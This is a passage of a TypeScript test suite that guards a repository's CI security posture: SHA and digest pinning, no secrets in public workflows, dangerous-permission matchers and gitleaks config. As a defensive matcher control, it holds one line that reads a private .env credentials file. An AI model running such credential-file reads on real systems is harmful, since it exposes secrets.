	// Rule 7e — an `environment:` GitHub can AUTO-CREATE has no protection rules,
	// so the manual approval CI.md relies on would exist only as an unexecuted UI
	// step (P2-24 / GATE-46).
	test('no job names its environment straight from an input', () => {
		const offenders: string[] = [];
		for (const { rel, src } of allWorkflows) {
			for (const [index, raw] of src.split('\n').entries()) {
				if (/^\s*environment:\s*\$\{\{\s*inputs\.\w+\s*\}\}\s*$/.test(raw)) {
					offenders.push(`${rel}:${index + 1}`);
				}
			}
		}
		expect(
			offenders,
			'`environment: ${{ inputs.x }}` AUTO-CREATES the named environment with NO protection ' +
				'rules when it does not exist yet. Map the input to an enumerated set of ' +
				`configured environments instead.\n  ${offenders.join('\n  ')}`,
		).toEqual([]);
	});

	// Rule 8b — THE PARKED TIER CANNOT ROT BEHIND THE LIVE ONE (P2-24 / CARRY-12).
	// Dependabot's github-actions ecosystem scans `.github/workflows` ONLY, so
	// `.github/workflows-selfhosted/` receives no update PRs at all: on activation
	// day its pins would be older than everything around them. Config cannot fix
	// that — GitHub does not scan the directory — so the gate is that any action
	// used in BOTH places carries the SAME SHA. Dependabot bumps the live copy;
	// this makes forgetting the parked copy a red build instead of a surprise.
	test('an action used in both tiers is pinned to the same SHA', () => {
		const pins = new Map<string, Map<string, string[]>>();
		for (const { rel, src } of allWorkflows) {
			for (const match of src.matchAll(/uses:\s*([\w./-]+)@([0-9a-f]{40})/g)) {
				const action = match[1] as string;
				const sha = match[2] as string;
				const byAction = pins.get(action) ?? new Map<string, string[]>();
				byAction.set(sha, [...(byAction.get(sha) ?? []), rel]);
				pins.set(action, byAction);
			}
		}
		// Anti-vacuity: the scan must actually see both tiers.
		expect(pins.size).toBeGreaterThan(3);
		expect(pins.has('actions/checkout')).toBe(true);

		const split: string[] = [];
		for (const [action, byAction] of pins) {
			if (byAction.size < 2) continue;
			const detail = [...byAction.entries()]
				.map(([sha, files]) => `${sha.slice(0, 12)} in ${files.join(', ')}`)
				.join(' | ');
			split.push(`${action}: ${detail}`);
		}
		expect(
			split,
			'The same action is pinned to different SHAs in different workflows. The parked ' +
				'self-hosted tier gets no Dependabot PRs, so a live-tier bump must be carried ' +
				`across by hand — that is what this catches.\n  ${split.join('\n  ')}`,
		).toEqual([]);
	});

	// Rule 11 — THE ISOLATED PACKAGES ARE ACTUALLY MEASURED (P2-23 / GATE-43).
	// hermetic.sh's own diagnostic greps `$dir/bunfig.toml` to print the threshold
	// that failed. For publication/site_builder that file did not exist: the
	// package's coverage was measured by NOTHING while its sibling held 0.8, and
	// the same script asserted eleven lines apart both that it had no bunfig and
	// that "Both daemons set coverageThreshold in their bunfig.toml". A comment
	// cannot be the thing that keeps two facts in step.
	test('every isolated daemon package MEASURES coverage, and the script says which enforce', () => {
		// Both packages must at least MEASURE. Enforcement differs today and that
		// difference has to be written down, because the previous state was a
		// script asserting two contradictory things eleven lines apart while one
		// package's coverage was measured by nothing.
		const enforcing: string[] = [];
		const reportingOnly: string[] = [];
		for (const pkg of ['publication/site_builder', 'publication/server_api/v2']) {
			const path = join(repoRoot, pkg, 'bunfig.toml');
			expect(existsSync(path), `${pkg}/bunfig.toml does not exist — hermetic.sh greps it`).toBe(
				true,
			);
			const bunfig = readFileSync(path, 'utf8');
			expect(bunfig, `${pkg} does not even measure coverage`).toMatch(/^\s*coverage\s*=\s*true/m);
			// A `coverageThreshold` in a COMMENT is not a threshold.
			const declares = /^\s*coverageThreshold\s*=/m.test(bunfig);
			(declares ? enforcing : reportingOnly).push(pkg);
			if (!declares) continue;
			const lines = Number(bunfig.match(/lines\s*=\s*([\d.]+)/)?.[1] ?? 0);
			const functions = Number(bunfig.match(/functions\s*=\s*([\d.]+)/)?.[1] ?? 0);
			// A floor of zero enforces nothing while looking like a gate.
			expect(lines, `${pkg} lines threshold is not a floor`).toBeGreaterThanOrEqual(0.8);
			expect(functions, `${pkg} functions threshold is not a floor`).toBeGreaterThanOrEqual(0.8);
		}
		expect(enforcing, 'server_api/v2 must keep enforcing 0.8').toContain(
			'publication/server_api/v2',
		);
		// site_builder reports but does not enforce YET (three route modules at
		// 0.00% functions, measured 2026-08-31). When that is fixed and a threshold
		// lands, this expectation flips — deliberately, in the same commit.
		expect(reportingOnly).toEqual(['publication/site_builder']);
	});

	test('hermetic.sh does not claim a package lacks the bunfig it greps', () => {
		// The exact contradiction this rule was written for: the script said
		// site_builder "has NO bunfig.toml at all" while its diagnostic grepped
		// that path and another comment said both daemons set a threshold.
		const script = readFileSync(join(repoRoot, 'scripts/ci/hermetic.sh'), 'utf8');
		expect(script).not.toMatch(/publication\/site_builder has NO bunfig\.toml/);
		// If it greps a package's bunfig, that bunfig must exist.
		if (script.includes('$dir/bunfig.toml')) {
			for (const pkg of ['publication/site_builder', 'publication/server_api/v2']) {
				expect(existsSync(join(repoRoot, pkg, 'bunfig.toml')), `${pkg}`).toBe(true);
			}
		}
	});

	test('anti-vacuity: the permissions matchers fire on the shapes they forbid', () => {
		// Without these controls the two rules above are "this list is empty" over
		// a corpus that happens to be clean today.
		const blanket = 'permissions: write-all\n';
		expect(/write-all/.test(blanket)).toBe(true);
		const pushRights = 'permissions:\n  contents: write\n';
		expect(/^\s*contents:\s*write\s*$/m.test(pushRights)).toBe(true);
		expect(/^\s*contents:\s*write\s*$/m.test('permissions:\n  contents: read\n')).toBe(false);
		expect(/^\s{2,}pull_request_target:/m.test('on:\n  pull_request_target:\n')).toBe(true);
		expect(/^\s{2,}workflow_run:/m.test('on:\n  workflow_run:\n')).toBe(true);
		// ...and the ordinary trigger is not mistaken for the dangerous one.
		expect(/^\s{2,}pull_request_target:/m.test('on:\n  pull_request:\n')).toBe(false);
	});

	// Rule 8 — supply chain. A tag is mutable; a SHA is the thing we reviewed.
	test('every action is pinned to a commit SHA, never a moving tag', () => {
		const USES = /^\s*(?:-\s*)?uses:\s*(\S+)/gm;
		const offenders: string[] = [];
		for (const { rel, src } of allWorkflows) {
			for (const [, ref] of src.matchAll(USES)) {
				const value = ref as string;
				// Local (`./…`) and container (`docker://…`) references are not fetched from
				// a third-party repo at run time; everything else is `owner/repo@ref`.
				if (value.startsWith('./') || value.startsWith('docker://')) continue;
				const at = value.lastIndexOf('@');
				const pin = at === -1 ? '' : value.slice(at + 1);
				if (!/^[0-9a-f]{40}$/.test(pin)) offenders.push(`${rel}: uses: ${value}`);
			}
		}
		expect(
			offenders,
			'A GitHub action referenced by tag (`@v5`) runs whatever commit that tag points at TODAY — the action owner, or anyone who compromises that account, can repoint it. Pin the 40-hex SHA and keep the version in a trailing comment (`uses: actions/checkout@fbc6f39… # v5`); Dependabot updates both. .github/workflows-selfhosted/deploy.yml hands one of these an SSH deploy key:',
		).toEqual([]);
	});

	/**
	 * Rule 9 — every `github/codeql-action/*` step is pinned to ONE SHA.
	 *
	 * `init` and `analyze` are two paths inside one repo and MUST come from the same
	 * release: init writes the database that analyze reads, and a major-version split
	 * fails the run. Dependabot cannot see that — it models each action PATH as its own
	 * dependency, so on 2026-08-03 it opened a PR (#77) bumping `analyze` to v4.37.4
	 * while leaving `init` on the v3 SHA. The PR's own CodeQL job went red, which is the
	 * lucky case; the unlucky one is a green-looking half-upgrade nobody reads.
	 *
	 * Dependabot will propose the same split every time codeql-action releases, so this
	 * has to be mechanical: whoever takes that PR gets a red gate here until both lines
	 * move together.
	 */
	// Rule 11 (2026-08-25) — FORK SAFETY: the executed tier references NO secret.
	// renderpci/dedalo is PUBLIC. GitHub withholds secrets from fork-PR
	// `pull_request` runs, but that protection is one trigger edit away
	// (`pull_request_target` hands them back alongside the fork's code), and a
	// hosted test tier NEEDS no secret: its Postgres service password is a
	// throwaway the workflow hardcodes. `${{ secrets.X }}` stays legal in
	// .github/workflows-selfhosted/, which GitHub does not execute and where the
	// private mirror supplies the values.
	//
	// Matched as the EXPRESSION, not a bare substring, so these files stay free to
	// DISCUSS the posture in their headers — the same courtesy rule 5 extends to
	// the phrase "self-hosted".
	test('no .github/workflows/ file references a secret (public repo, fork PRs)', () => {
		const offenders = workflowFiles
			.map((file) => join('.github', 'workflows', file))
			.filter((rel) => /\$\{\{\s*secrets\./.test(read(rel)));
		expect(
			offenders,
			'A secret reference in the EXECUTED tier of a public repo is a standing invitation: one trigger change and fork-PR code runs with it populated. A test tier needs none — hardcode the throwaway service password, and put anything genuinely secret in .github/workflows-selfhosted/ for the private mirror:',
		).toEqual([]);
	});

	// Rule 12 (2026-08-25) — container images are DIGEST-pinned. Rule 8 above
	// inspects only `uses:` lines, so a `services:` (or `container:`) image was
	// invisible to it — and that is rule 8's own threat with MORE reach: the
	// container shares the runner with the checkout, and a tag is repointable by
	// its publisher at any time. security.yml:42-44 already digest-pins the
	// gitleaks image by hand for exactly this stated reason; this makes the
	// convention a gate. Binds both tiers, like rule 8.
	test('every workflow image: is pinned by digest, never a tag', () => {
		const offenders: string[] = [];
		for (const { rel, src } of allWorkflows) {
			for (const [, image] of src.matchAll(/^\s*image:\s*(\S+)/gm)) {
				if (!/@sha256:[0-9a-f]{64}$/.test(image as string))
					offenders.push(`${rel}: image: ${image}`);
			}
		}
		expect(
			offenders,
			'A workflow image referenced by tag runs whatever its publisher points that tag at TODAY, on the same runner as the checkout. Pin the digest and keep the human-readable version in a trailing comment — the security.yml gitleaks precedent:',
		).toEqual([]);
	});

	test('every codeql-action step is pinned to the same SHA (init and analyze cannot split)', () => {
		const CODEQL_USES = /uses:\s*github\/codeql-action\/[a-z-]+@([0-9a-f]{40})/g;
		const bySha = new Map<string, string[]>();
		for (const { rel, src } of allWorkflows) {
			for (const [line, sha] of [...src.matchAll(CODEQL_USES)].map(
				(m) => [m[0] as string, m[1] as string] as const,
			)) {
				bySha.set(sha, [...(bySha.get(sha) ?? []), `${rel}: ${line}`]);
			}
		}
		// Guards the guard: rename the workflow or the action and this would pass over an
		// empty map, proving nothing — the same zero-length trap the ledger gates carry.
		expect(
			bySha.size,
			'No SHA-pinned github/codeql-action step found in any workflow. Either CodeQL was removed (then delete this rule deliberately) or the pin grammar changed and this gate is now blind.',
		).toBeGreaterThan(0);
		expect(
			[...bySha.entries()].map(([sha, where]) => `${sha}: ${where.join(' | ')}`),
			'The codeql-action steps are pinned to DIFFERENT commits. `init` builds the database `analyze` consumes; across majors that run fails. Bump every codeql-action line to one SHA in one change — Dependabot proposes them separately and cannot know they are one dependency:',
		).toHaveLength(1);
	});

	// The secret scanner's config is the one place where "make the alert go away" and
	// "fix the leak" look identical in a diff. Keep the default ruleset load-bearing.
	test('the gitleaks config extends the default ruleset instead of replacing it', () => {
		const src = read('.gitleaks.toml');
		expect(
			/^\s*useDefault\s*=\s*true\s*$/m.test(src),
			'.gitleaks.toml must set `[extend] useDefault = true`. Without it, our two allowlists REPLACE ~170 upstream provider rules and the scan reports a clean repo because it stopped looking — and GitLab loads this same file wholesale through .gitlab/secret-detection-ruleset.toml, so the blindness would be on both platforms at once.',
		).toBe(true);
	});

	test('.gitlab-ci.yml oven/bun image tag equals the .bun-version pin', () => {
		const src = read('.gitlab-ci.yml');
		const tag = src.match(/image:\s*oven\/bun:(\S+)/)?.[1];
		expect(tag, '.gitlab-ci.yml: oven/bun:<tag> image not found').toBeDefined();
		expect(tag).toBe(bunPin);
	});

	// Binds to BOTH tiers: the self-hosted jobs now live in workflows-selfhosted/, and the
	// invariant has to travel with them or it silently stops guarding anything.
	test('self-hosted workflows running parity/verify set ORACLE_REQUIRED: "1"', () => {
		for (const { rel, src } of allWorkflows) {
			if (!targetsSelfHosted(src)) continue;
			const runsOracleGates =
				src.includes('test/parity') ||
				src.includes('scripts/verify.ts') ||
				/\bbun test\b/.test(src);
			if (!runsOracleGates) continue;
			expect(src, `${rel}: self-hosted oracle-gated job must set ORACLE_REQUIRED: "1"`).toContain(
				'ORACLE_REQUIRED: "1"',
			);
		}
	});

	test('the GitHub hermetic jobs and .gitlab-ci.yml invoke the shared hermetic.sh', () => {
		for (const file of [
			'.github/workflows/ci.yml',
			'.github/workflows/main.yml',
			'.gitlab-ci.yml',
		]) {
			expect(read(file), `${file}: hermetic tier must run scripts/ci/hermetic.sh`).toContain(
				'scripts/ci/hermetic.sh',
			);
		}
	});

	// Rule 3c — every tripwire has exactly ONE executing home. NOT_HERMETIC is an
	// ASSIGNMENT to the DB tier, not an excuse: its key set and db_tier.sh's
	// DB_TIER_TRIPWIRES must be EQUAL. Without that equality "excluded from
	// hermetic" still meant "runs nowhere" — and the registration trap was live:
	// wiring a DB gate into HERMETIC_TRIPWIRES to make it run SOMEWHERE reddened
	// its own NOT_HERMETIC row. Now a DB gate registers on the DB tier, where it
	// belongs, and "runs on no tier" is mechanically impossible.
	test('every tripwire runs on exactly one executing tier (hermetic.sh XOR db_tier.sh)', () => {
		const hermetic = new Set(hermeticTripwires());
		const dbTier = dbTierTripwires();
		const verify = verifyTripwires();
		const excluded = verify.filter((t) => !hermetic.has(t));

		for (const t of excluded) {
			expect(
				NOT_HERMETIC.has(t),
				`${t} runs on NO executing tier: it is in verify.ts TRIPWIRES but not in ` +
					'hermetic.sh, and carries no assignment. Wire it into HERMETIC_TRIPWIRES ' +
					'(re-verify it DB-less first, with DB_PORT closed) or assign it to the DB ' +
					'tier: a NOT_HERMETIC row naming the live dependency PLUS the matching ' +
					'DB_TIER_TRIPWIRES entry in scripts/ci/db_tier.sh.',
			).toBe(true);
		}

		// Stale rows are red in both directions.
		const verifySet = new Set(verify);
		for (const t of NOT_HERMETIC.keys()) {
			expect(verifySet.has(t), `NOT_HERMETIC lists ${t}, which is no longer a tripwire`).toBe(true);
			expect(
				hermetic.has(t),
				`NOT_HERMETIC lists ${t} as un-hostable, but hermetic.sh now runs it — delete the row AND its db_tier.sh entry`,
			).toBe(false);
		}

		// THE ASSIGNMENT, exact in both directions. Equality rather than ⊆ is
		// deliberate, and each direction closes a real hole:
		//  - a NOT_HERMETIC key missing from db_tier.sh is a gate excused but not
		//    running — the original hole, back;
		//  - a db_tier.sh entry with no NOT_HERMETIC row is a gate running with no
		//    written reason — the list rots into a dumping ground;
		//  - combined with the hermetic-disjointness check above, equality also
		//    FORBIDS a gate on both tiers. That would burn hosted-Postgres minutes
		//    re-proving what the hermetic tier already proved, and dissolves the
		//    one-stated-home property this rule exists to create. A gate that ever
		//    genuinely needs both (behaviour differs with a DB present) is a
		//    deliberate rule change with its reason written here, not a quiet overlap.
		// Equality also gives D ⊆ verify.ts for free, so the DB tier needs no
		// separate subset rule of its own.
		expect([...dbTier].sort()).toEqual([...NOT_HERMETIC.keys()].sort());
	});

	// The DB tier's WIRING: db_tier.sh alone is a script nothing runs. Before
	// 2026-08-25 these 19 gates ran on NO executing tier precisely because the only
	// DB workflow lived in workflows-selfhosted/, which GitHub does not execute.
	test('the hosted DB tier is wired: db.yml invokes db_tier.sh and declares its service image', () => {
		const src = read('.github/workflows/db.yml');
		expect(src, '.github/workflows/db.yml: the DB tier must run scripts/ci/db_tier.sh').toContain(
			'scripts/ci/db_tier.sh',
		);
		expect(
			/^\s*services:/m.test(src),
			'.github/workflows/db.yml: no services: block — the tier needs its own Postgres; without one the DB gates die at connect and the run is noise, not a gate',
		).toBe(true);
		expect(
			[...src.matchAll(/^\s*image:\s*(\S+)/gm)].length,
			'.github/workflows/db.yml: the services: block declares no image:, so the digest-pin rule would pass over nothing',
		).toBeGreaterThan(0);
	});

	/**
	 * Rule 13 — db_tier.sh must not require ../private/.env. See the header for
	 * the measured breakage: the tier's guard call hard-failed on the file every
	 * GitHub run, so "wired" meant "never reached" from the day the tier landed.
	 */
	test('db_tier.sh contains no command that requires ../private/.env (rule 13)', () => {
		// Positive controls FIRST — a matcher that cannot catch the planted
		// offender proves nothing about a clean scan. Each control is one of the
		// three shapes the matcher claims to catch, plus the two shapes it must
		// NOT catch (the flagged guard call, and a comment discussing the file).
		expect(
			privateEnvOffenders('cat ../private/.env'),
			'matcher control: a direct ../private/.env read must be flagged — the matcher is blind and this rule is vacuous',
		).toHaveLength(1);
		expect(
			privateEnvOffenders('bash scripts/ci/env_guard.sh'),
			'matcher control: a bare env_guard.sh call (check 2 hard-fails on the missing file) must be flagged',
		).toHaveLength(1);
		expect(
			privateEnvOffenders('bash scripts/ci/link_siblings.sh'),
			'matcher control: link_siblings.sh materializes the sibling ../private tree and must be flagged',
		).toHaveLength(1);
		expect(
			privateEnvOffenders('bash scripts/ci/env_guard.sh --no-private-env'),
			'matcher control: the flagged guard call is the SANCTIONED form and must NOT be flagged',
		).toHaveLength(0);
		expect(
			privateEnvOffenders('# the tier needs no ../private/.env'),
			'matcher control: comments must stay free to discuss the file they forswear',
		).toHaveLength(0);

		const src = read('scripts/ci/db_tier.sh');
		expect(
			privateEnvOffenders(src),
			'scripts/ci/db_tier.sh requires ../private/.env, which never exists on a hosted runner: the tier dies before test:db:setup and its tripwires run NOWHERE while reporting as wired — the exact never-reached state measured 2026-08-25. Compose the config in-process (the export block) or pass --no-private-env to env_guard.sh:',
		).toEqual([]);

		// Guard the guard, both halves: the bun-pin check must still be reached
		// (deleting the env_guard call would also pass the scan above), and
		// env_guard.sh must still HAVE a private-env check for its self-hosted
		// callers — if check 2 were deleted outright, --no-private-env would be
		// skipping nothing and the flag's meaning silently rots.
		expect(
			src.includes('env_guard.sh --no-private-env'),
			'db_tier.sh no longer calls env_guard.sh at all — the scan is happy but the bun-pin verification is gone; keep the call with --no-private-env',
		).toBe(true);
		const guard = read('scripts/ci/env_guard.sh');
		expect(
			guard.includes('REQUIRE_PRIVATE_ENV') && guard.includes('../private/.env'),
			'env_guard.sh lost its skippable private-env check — --no-private-env now skips nothing, so either restore check 2 or retire the flag and this assertion together, deliberately',
		).toBe(true);
	});

	/**
	 * Rule 14 — every DIFFUSION_JOBS_TABLE / DIFFUSION_ACTIVITY_TABLE literal
	 * under scripts/ and test/ satisfies the engine's own seam-guard regex,
	 * which throws AT MODULE LOAD on violation. See the header for the latent
	 * db_tier.sh kill this closes. Three assignment shapes are scanned; an
	 * override reaching the env by a route none of them cover (e.g. a computed
	 * string) is NOT caught here — the engine's load-time throw remains the
	 * backstop, and diffusion_jobs_table_seam.test.ts proves that throw fires.
	 */
	test('diffusion table-override literals under scripts/ and test/ carry the engine prefix (rule 14)', () => {
		const guardRe = diffusionSeamGuardRegex();
		// The engine's guard must still be the prefix guard this rule narrates;
		// if it loosened to something that admits the old dedalo_ts_ci_* names,
		// the extraction "succeeded" but the rule's premise is gone.
		expect(
			guardRe.test('dedalo_ts_test_ci_diffusion_jobs'),
			'the extracted engine regex rejects the canonical dedalo_ts_test_ci_* form — the guard changed shape; re-read schema.ts before touching this rule',
		).toBe(true);
		expect(guardRe.test('dedalo_ts_ci_diffusion_jobs')).toBe(false);

		// The three assignment shapes. Key names are BUILT by concatenation in
		// the controls below so this file's own source never contains a
		// literal-assignment shape for its own scan to trip over.
		const SHAPES: readonly RegExp[] = [
			// shell parameter-expansion default:   : "${<KEY>:=some_table}"
			// (the key is spelled by the alternation — writing the real key in
			// this comment would make this file its own first offender).
			/:\s*"\$\{(DIFFUSION_(?:JOBS|ACTIVITY)_TABLE):=([a-z][a-z0-9_]*)\}"/g,
			// '=' with a QUOTED lowercase literal — TS process.env assignment and
			// the SCRATCH_*_TABLE const indirection the retry-queue /
			// delete-outcomes tests use. The quote is REQUIRED: an unquoted
			// grammar captured the leading identifier of any expression RHS
			// (`= process.env.X` yielded a phantom literal 'process'), so
			// expression assignments are deliberately not this shape's business.
			/\b([A-Z0-9_]*(?:JOBS|ACTIVITY)_TABLE)\s*=\s*'([a-z][a-z0-9_]*)'/g,
			// shell plain assignment, whole line:   KEY=some_table
			/^\s*(?:export\s+)?([A-Z0-9_]*(?:JOBS|ACTIVITY)_TABLE)=([a-z][a-z0-9_]*)\s*$/gm,
			// object/env property, with the optional readEnv(...) ?? fallback the
			// client test server uses (value may sit on the next line).
			/\b(DIFFUSION_(?:JOBS|ACTIVITY)_TABLE)\s*:\s*[\r\n\t ]*(?:readEnv\([^)]*\)\s*\?\?\s*)?'([a-z][a-z0-9_]*)'/g,
		];
		const extract = (src: string): Array<{ key: string; value: string }> => {
			const found: Array<{ key: string; value: string }> = [];
			for (const re of SHAPES) {
				for (const m of src.matchAll(re)) {
					found.push({ key: m[1] as string, value: m[2] as string });
				}
			}
			return found;
		};

		// Positive control: each shape must catch a planted bad literal, or the
		// scan below is a walk over files it cannot read.
		const K = `DIFFUSION_JOBS${'_TABLE'}`;
		const controls = [
			`: "\${${K}:=dedalo_bad}"`,
			`process.env.${K} = 'dedalo_bad'`,
			`${K}=dedalo_bad`,
			`${K}: readEnv('${K}') ?? 'dedalo_bad'`,
		];
		for (const control of controls) {
			const hits = extract(control);
			expect(hits.length, `shape control not matched, the scan is blind to it: ${control}`).toBe(1);
			expect(guardRe.test((hits[0] as { value: string }).value)).toBe(false);
		}
		// Negative control: an expression RHS is not a literal — the unquoted
		// grammar this replaces read `= process.env.X` as a literal 'process'.
		expect(
			extract(`const PRELOAD = process.env.${K};`),
			'the scan captured a phantom literal out of an expression assignment — the quoted-literal grammar regressed',
		).toHaveLength(0);

		// EXEMPT, with its reason: the seam gate's own negative controls are
		// deliberately invalid literals — they exist to prove the engine's
		// load-time refusal fires. The exemption is kept LIVE below: if that file
		// stops containing a non-conforming literal, the row is stale and red.
		const EXEMPT = 'test/unit/diffusion_jobs_table_seam.test.ts';

		const glob = new Glob('**/*.{ts,sh}');
		const offenders: string[] = [];
		let sites = 0;
		let exemptBadLiterals = 0;
		for (const dir of ['scripts', 'test']) {
			for (const rel of glob.scanSync({ cwd: join(repoRoot, dir) })) {
				const file = join(dir, rel).replaceAll('\\', '/');
				for (const { key, value } of extract(read(file))) {
					sites++;
					if (guardRe.test(value)) continue;
					if (file === EXEMPT) {
						exemptBadLiterals++;
						continue;
					}
					offenders.push(`${file}: ${key} = '${value}'`);
				}
			}
		}
		expect(
			offenders,
			`A diffusion table-override literal violates the engine's seam guard ${guardRe} (src/diffusion/jobs/schema.ts / diffusion_delete.ts). The guard THROWS AT MODULE LOAD, so the first gate whose closure imports either module dies at import with this value in the env — the db_tier.sh latent kill of 2026-08-25. Rename the table, never the regex; the prefix is what stops production being redirected to an arbitrary table:`,
		).toEqual([]);
		// Anti-vacuity floor: 12 assignment sites measured 2026-08-25 (db_tier.sh
		// 2, test/preload/session_db.ts 2, scripts/update_drill.ts 2,
		// scripts/client_test_server.ts 2, the seam gate's 2 negative controls,
		// the 2 SCRATCH_ACTIVITY_TABLE consts). Under 8 means the shapes or the
		// walk broke, not that the repo cleaned itself up.
		expect(
			sites,
			`only ${sites} diffusion table-override assignment sites found under scripts/ and test/ — the scan shapes or the directory walk are broken and this rule is passing over nothing`,
		).toBeGreaterThanOrEqual(8);
		expect(
			exemptBadLiterals,
			`${EXEMPT} is exempted as the home of the deliberate BAD literals that prove the engine refusal, but it no longer contains any — the exemption is stale; delete it`,
		).toBeGreaterThan(0);
	});

	/**
	 * RULE 15 — CONCURRENCY MAY NEVER COST A VERDICT.
	 *
	 * Phase 4 of the parallel-test work made three whole-tree stages run at the
	 * same time: typecheck ∥ lint in BOTH `scripts/ci/hermetic.sh` and
	 * `scripts/verify.ts`, and the two isolated daemon packages
	 * (publication/site_builder, publication/server_api/v2) concurrently in
	 * hermetic.sh. Every one of those is safe ONLY while both branches are still
	 * waited on and both verdicts still reported. The failure mode is silent and
	 * it is the reason this rule exists rather than a comment: under `set -e` a
	 * first failing background job that is not explicitly waited on aborts the
	 * script, and the SECOND package's result — pass or fail — is never printed.
	 * The tier stays "red", so nobody notices that half its coverage stopped
	 * being reported at all.
	 *
	 * MEASURED, both directions, on Bun 1.4.0: `bun run --parallel a b` exits 1
	 * when a script fails WITH AND WITHOUT `--no-exit-on-error`. The flag does not
	 * swallow the failure; it only lets the other script finish first. So the flag
	 * is required here (a red lint must not pre-empt the typecheck's verdict), and
	 * dropping it is a real regression in what the tier reports.
	 */
	test('parallelised CI stages still wait on and report every verdict (rule 15)', () => {
		const hermeticRaw = readFileSync(join(repoRoot, 'scripts/ci/hermetic.sh'), 'utf8');
		// COMMENTS ARE NOT CODE, and this file's comments DISCUSS the very command
		// the matcher looks for ("`bun run --parallel` runs SCRIPTS, not arbitrary
		// commands"). Scanning raw text flagged the prose explaining the rule —
		// the same shape mock_isolation_tripwire records: a raw read baselines a
		// file for MENTIONING the thing the rule bans. Strip shell comment lines
		// for the CODE assertions; the toContain checks below still read the raw
		// text, since they are looking for a line that must literally be present.
		const hermetic = hermeticRaw
			.split('\n')
			.filter((line) => !line.trimStart().startsWith('#'))
			.join('\n');
		const verify = readFileSync(join(repoRoot, 'scripts/verify.ts'), 'utf8');

		// Positive controls FIRST: a matcher that cannot catch the planted
		// offender proves nothing about a clean scan.
		// Anchored to the START of a line: an INVOCATION, never a mention. The
		// unanchored form flagged this file's own `echo "== hermetic: typecheck +
		// lint (bun run --parallel)"` label and its explanatory comments — a
		// matcher that cannot tell a command from prose about the command reports
		// the rule's own documentation as the violation.
		const parallelWithoutFlag = (text: string): boolean =>
			/^[ \t]*bun run --parallel(?! --no-exit-on-error)/m.test(text);
		expect(
			parallelWithoutFlag('bun run --parallel typecheck lint'),
			'matcher control: a --parallel call missing --no-exit-on-error must be flagged, or this rule is vacuous',
		).toBe(true);
		expect(parallelWithoutFlag('bun run --parallel --no-exit-on-error typecheck lint')).toBe(false);
		// ...and a MENTION in prose or an echo label is not an invocation.
		expect(parallelWithoutFlag('# see `bun run --parallel` for the script runner')).toBe(false);
		expect(parallelWithoutFlag('echo "== typecheck + lint (bun run --parallel)"')).toBe(false);

		// hermetic.sh: the concurrent typecheck+lint keeps the flag that makes
		// both verdicts survive.
		expect(hermeticRaw).toContain(
			'bun run --parallel --no-exit-on-error typecheck lint lint:browser',
		);
		expect(
			parallelWithoutFlag(hermetic),
			"scripts/ci/hermetic.sh runs `bun run --parallel` without --no-exit-on-error: one red stage will pre-empt the other stage's verdict",
		).toBe(false);

		// Both scripts it names must be real package.json scripts — `bun run
		// --parallel` runs SCRIPTS, so a renamed script turns the stage into a
		// "script not found" that `set -e` converts into an unexplained tier failure.
		const pkg = JSON.parse(readFileSync(join(repoRoot, 'package.json'), 'utf8')) as {
			scripts: Record<string, string>;
		};
		for (const name of ['typecheck', 'lint', 'lint:browser']) {
			expect(
				pkg.scripts[name],
				`package.json must define the "${name}" script that hermetic.sh runs in parallel`,
			).toBeString();
		}

		// hermetic.sh: BOTH daemon jobs are backgrounded, BOTH are waited on by
		// pid, and BOTH exit codes are consulted. Anti-vacuity floor: exactly two
		// of each, so deleting one job silently is red.
		const backgrounded = hermeticRaw.match(/daemon_gate \S+ > \S+ 2>&1 &/g) ?? [];
		expect(
			backgrounded.length,
			'hermetic.sh must background exactly the two daemon packages — a third or a missing one means this rule no longer describes the tier',
		).toBe(2);
		const waits = hermeticRaw.match(/wait "\$\w+" \|\| \w+=\$\?/g) ?? [];
		expect(
			waits.length,
			"every backgrounded daemon gate must be waited on with its exit status captured, or `set -e` drops the other package's verdict",
		).toBe(2);

		// verify.ts: the concurrent static stages have a PINNED report order, so
		// the summary table cannot reshuffle between runs.
		// The browser-lint budget (P1-17) joined the concurrent static block: `biome
		// check .` cannot see the trees biome.jsonc excludes, so a green lint says
		// nothing about them and the budget is a SEPARATE verdict that must survive
		// alongside the other two.
		expect(verify).toContain('await Promise.all([typecheck(), lint(), lintBrowserBudget()]);');
		expect(
			verify,
			'every concurrently-run static stage must appear in STATIC_STAGE_ORDER, or the summary reshuffles',
		).toContain("const STATIC_STAGE_ORDER = ['typecheck', 'lint', 'lint:browser'];");
		expect(
			verify,
			'verify.ts runs its static stages concurrently, so it must pin their summary order — a verdict table that reshuffles is one people stop reading',
		).toContain('STATIC_STAGE_ORDER');
	});

	test('hermetic.sh tripwires are a subset of verify.ts TRIPWIRES', () => {
		const verify = new Set(verifyTripwires());
		for (const t of hermeticTripwires()) {
			expect(verify.has(t), `hermetic.sh runs ${t} which verify.ts TRIPWIRES does not list`).toBe(
				true,
			);
		}
	});

	test('verify.ts TRIPWIRES equals the engineering/TRIPWIRES.md index exactly', () => {
		expect([...verifyTripwires()].sort()).toEqual([...ledgerTripwires()].sort());
	});

	// Rule 10 — the index describes what each gate ASSERTS, never how it is doing.
	test('no TRIPWIRES.md row narrates a transient red/failing state as a standing fact', () => {
		const src = read('engineering/TRIPWIRES.md');
		const rows = [...src.matchAll(/^\| (test\/[^\s|]+\.test\.ts) \|.*$/gm)].map(
			(m) => [m[1] as string, m[0] as string] as const,
		);
		// Anti-vacuity: the same grammar rule 4 parses — if it drifted, this rule
		// would otherwise scan zero rows and pass having read nothing.
		expect(
			rows.length,
			'engineering/TRIPWIRES.md: the row grammar changed and this rule is now scanning nothing',
		).toBe(ledgerTripwires().length);
		const offenders = rows.flatMap(([path, row]) =>
			findStatusProse(row).map((excerpt) => `${path}: “${excerpt}”`),
		);
		expect(
			offenders,
			'A TRIPWIRES.md row is where a RULE lives, never where its current state lives. Transient state — a gate that is not green at some moment, the files it is over on — belongs in rewrite/LEDGER.md (gitignored, not on a clone) or in the commit message of the change that opened it; narrating it in the index makes that state read as the expected condition and trains the regeneration reflex the ratchets exist to prevent. It is also never load-bearing: rule 4 parses only the first column, and scripts/verify.ts has no allowlist. Fix the gate (or take the deliberate, reviewed regression path its own message names), then DELETE the narration — keep the general rule wording around it, which is usually correct. Each line quotes the offending excerpt:\n  ' +
				offenders.join('\n  '),
		).toEqual([]);
	});

	test('every tripwire file listed anywhere actually exists', async () => {
		for (const t of new Set([
			...verifyTripwires(),
			...hermeticTripwires(),
			...dbTierTripwires(),
			...ledgerTripwires(),
		])) {
			expect(await Bun.file(join(repoRoot, t)).exists(), `${t} listed but missing on disk`).toBe(
				true,
			);
		}
	});
});
